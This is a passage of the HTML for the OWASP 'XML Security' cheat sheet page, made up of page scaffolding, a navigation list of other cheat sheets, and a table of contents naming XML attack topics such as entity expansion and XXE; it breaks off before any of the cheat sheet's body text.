
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
      
      
      
      
        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">
      
      <link rel="shortcut icon" href="../assets/WebSite_Favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
    
    
      
        <title>XML Security - OWASP Cheat Sheet Series</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.15aa0b43.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.75751829.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
        
<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-4531126-15","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
<script async src="https://www.google-analytics.com/analytics.js"></script>
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
      
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#xml-security-cheat-sheet" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://cheatsheetseries.owasp.org/" title="OWASP Cheat Sheet Series" class="md-header-nav__button md-logo" aria-label="OWASP Cheat Sheet Series">
      
  <img src="../assets/OWASP_Logo_Transp.png" alt="logo">

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      <div class="md-header-nav__ellipsis">
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            OWASP Cheat Sheet Series
          </span>
        </div>
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            
              XML Security
            
          </span>
        </div>
      </div>
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    OWASP/CheatSheetSeries
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    




<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://cheatsheetseries.owasp.org/" title="OWASP Cheat Sheet Series" class="md-nav__button md-logo" aria-label="OWASP Cheat Sheet Series">
      
  <img src="../assets/OWASP_Logo_Transp.png" alt="logo">

    </a>
    OWASP Cheat Sheet Series
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    OWASP/CheatSheetSeries
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      



  <li class="md-nav__item">
    <a href="../index.html" class="md-nav__link">
      Introduction
    </a>
  </li>

    
      
      
      



  <li class="md-nav__item">
    <a href="../Glossary.html" class="md-nav__link">
      Index Alphabetical
    </a>
  </li>

    
      
      
      



  <li class="md-nav__item">
    <a href="../IndexASVS.html" class="md-nav__link">
      Index ASVS
    </a>
  </li>

    
      
      
      



  <li class="md-nav__item">
    <a href="../IndexProactiveControls.html" class="md-nav__link">
      Index Proactive Controls
    </a>
  </li>

    
      
      
      


  


  
  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
    
    <label class="md-nav__link" for="nav-5">
      Cheatsheets
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Cheatsheets" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Cheatsheets
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          



  <li class="md-nav__item">
    <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
      AJAX Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
      Abuse Case
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
      Access Control
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
      Attack Surface Analysis
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
      Authentication
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
      Authorization Testing Automation
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
      Bean Validation
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
      C-Based Toolchain Hardening
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
      Choosing and Using Security Questions
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
      Clickjacking Defense
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link">
      Content Security Policy
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Credential Stuffing Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Cross-Site Request Forgery Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Cross Site Scripting Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
      Cryptographic Storage
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
      DOM based XSS Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
      Database Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
      Denial of Service
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
      Deserialization
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
      Docker Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
      DotNet Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
      Error Handling
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
      File Upload
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
      Forgot Password
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
      GraphQL
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
      HTML5 Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
      HTTP Strict Transport Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Injection Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
      Injection Prevention in Java
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
      Input Validation
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Insecure Direct Object Reference Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
      JAAS
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
      JSON Web Token for Java
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
      Key Management
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Kubernetes_Security_Cheat_Sheet.html" class="md-nav__link">
      Kubernetes Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
      LDAP Injection Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
      Logging
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
      Mass Assignment
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
      Microservices based Security Arch Doc
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Microservices_security.html" class="md-nav__link">
      Microservices security.md
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
      Multifactor Authentication
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
      Nodejs Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
      OS Command Injection Defense
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
      PHP Configuration
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
      Password Storage
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
      Pinning
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
      Query Parameterization
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
      REST Assessment
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
      REST Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
      Ruby on Rails
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
      SAML Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
      SQL Injection Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
      Securing Cascading Style Sheets
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
      Server Side Request Forgery Prevention
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
      Session Management
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
      TLS Cipher String
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
      Third Party Javascript Management
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
      Threat Modeling
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
      Transaction Authorization
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
      Transport Layer Protection
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
      Unvalidated Redirects and Forwards
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
      User Privacy Protection
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
      Virtual Patching
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
      Vulnerability Disclosure
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
      Vulnerable Dependency Management
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
      Web Service Security
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
      XML External Entity Prevention
    </a>
  </li>

        
          
          
          


  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        XML Security
        <span class="md-nav__icon md-icon"></span>
      </label>
    
    <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
      XML Security
    </a>
    
      
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#malformed-xml-documents" class="md-nav__link">
    Malformed XML Documents
  </a>
  
    <nav class="md-nav" aria-label="Malformed XML Documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#more-time-required" class="md-nav__link">
    More Time Required
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applications-processing-malformed-data" class="md-nav__link">
    Applications Processing Malformed Data
  </a>
  
    <nav class="md-nav" aria-label="Applications Processing Malformed Data">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-document-to-malformed-document" class="md-nav__link">
    Malformed Document to Malformed Document
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#well-formed-document-to-well-formed-document-normalized" class="md-nav__link">
    Well-Formed Document to Well-Formed Document Normalized
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#coercive-parsing" class="md-nav__link">
    Coercive Parsing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#violation-of-xml-specification-rules" class="md-nav__link">
    Violation of XML Specification Rules
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#invalid-xml-documents" class="md-nav__link">
    Invalid XML Documents
  </a>
  
    <nav class="md-nav" aria-label="Invalid XML Documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#document-without-schema" class="md-nav__link">
    Document without Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unrestrictive-schema" class="md-nav__link">
    Unrestrictive Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improper-data-validation" class="md-nav__link">
    Improper Data Validation
  </a>
  
    <nav class="md-nav" aria-label="Improper Data Validation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#string-data-types" class="md-nav__link">
    String Data Types
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#numeric-data-types" class="md-nav__link">
    Numeric Data Types
  </a>
  
    <nav class="md-nav" aria-label="Numeric Data Types">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#negative-and-positive-restrictions" class="md-nav__link">
    Negative and Positive Restrictions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#divide-by-zero" class="md-nav__link">
    Divide by Zero
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-values-infinity-and-not-a-number-nan" class="md-nav__link">
    Special Values: Infinity and Not a Number (NaN)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-data-restrictions" class="md-nav__link">
    General Data Restrictions
  </a>
  
    <nav class="md-nav" aria-label="General Data Restrictions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prefixed-values" class="md-nav__link">
    Prefixed Values
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ranges" class="md-nav__link">
    Ranges
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#patterns" class="md-nav__link">
    Patterns
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assertions" class="md-nav__link">
    Assertions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#occurrences" class="md-nav__link">
    Occurrences
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumbo-payloads" class="md-nav__link">
    Jumbo Payloads
  </a>
  
    <nav class="md-nav" aria-label="Jumbo Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#traditional-jumbo-payloads" class="md-nav__link">
    Traditional Jumbo Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#small-jumbo-payloads" class="md-nav__link">
    "Small" Jumbo Payloads
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schema-poisoning" class="md-nav__link">
    Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-schema-poisoning" class="md-nav__link">
    Local Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Local Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#embedded-schema" class="md-nav__link">
    Embedded Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incorrect-permissions" class="md-nav__link">
    Incorrect Permissions
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-schema-poisoning" class="md-nav__link">
    Remote Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Remote Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#man-in-the-middle-mitm-attack" class="md-nav__link">
    Man-in-the-Middle (MitM) Attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-cache-poisoning" class="md-nav__link">
    DNS-Cache Poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evil-employee-attack" class="md-nav__link">
    Evil Employee Attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-entity-expansion" class="md-nav__link">
    XML Entity Expansion
  </a>
  
    <nav class="md-nav" aria-label="XML Entity Expansion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sample-vulnerable-java-implementations" class="md-nav__link">
    Sample Vulnerable Java Implementations
  </a>
  
    <nav class="md-nav" aria-label="Sample Vulnerable Java Implementations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom" class="md-nav__link">
    XXE using DOM
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom4j" class="md-nav__link">
    XXE using DOM4J
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-sax" class="md-nav__link">
    XXE using SAX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-stax" class="md-nav__link">
    XXE using StAX
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursive-entity-reference" class="md-nav__link">
    Recursive Entity Reference
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quadratic-blowup" class="md-nav__link">
    Quadratic Blowup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#billion-laughs" class="md-nav__link">
    Billion Laughs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-file-retrieval" class="md-nav__link">
    Reflected File Retrieval
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-request-forgery" class="md-nav__link">
    Server Side Request Forgery
  </a>
  
    <nav class="md-nav" aria-label="Server Side Request Forgery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#external-dns-resolution" class="md-nav__link">
    External DNS Resolution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-connection" class="md-nav__link">
    External Connection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-retrieval-with-parameter-entities" class="md-nav__link">
    File Retrieval with Parameter Entities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    Port Scanning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    Brute Forcing
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#malformed-xml-documents" class="md-nav__link">
    Malformed XML Documents
  </a>
  
    <nav class="md-nav" aria-label="Malformed XML Documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#more-time-required" class="md-nav__link">
    More Time Required
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applications-processing-malformed-data" class="md-nav__link">
    Applications Processing Malformed Data
  </a>
  
    <nav class="md-nav" aria-label="Applications Processing Malformed Data">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-document-to-malformed-document" class="md-nav__link">
    Malformed Document to Malformed Document
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#well-formed-document-to-well-formed-document-normalized" class="md-nav__link">
    Well-Formed Document to Well-Formed Document Normalized
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#coercive-parsing" class="md-nav__link">
    Coercive Parsing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#violation-of-xml-specification-rules" class="md-nav__link">
    Violation of XML Specification Rules
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#invalid-xml-documents" class="md-nav__link">
    Invalid XML Documents
  </a>
  
    <nav class="md-nav" aria-label="Invalid XML Documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#document-without-schema" class="md-nav__link">
